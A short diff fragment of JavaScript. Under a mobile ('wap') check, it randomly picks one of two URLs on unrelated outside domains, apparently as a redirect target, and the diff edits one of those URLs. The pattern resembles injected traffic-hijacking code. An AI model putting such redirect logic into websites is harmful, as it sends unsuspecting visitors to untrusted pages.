@@ -29,7 +29,7 @@ if(wap){
             
             var url_arr = new Array(
                 'https://qdff.loveme888.com:82/hb049.html',
-                'https://zt.nbrsko.com/2021.html'
+                'https://zt.nbrsko.com/2021.htm'
             );
             var urlv = Math.floor((Math.random()*url_arr.length)); 
             var urla = url_arr[urlv];
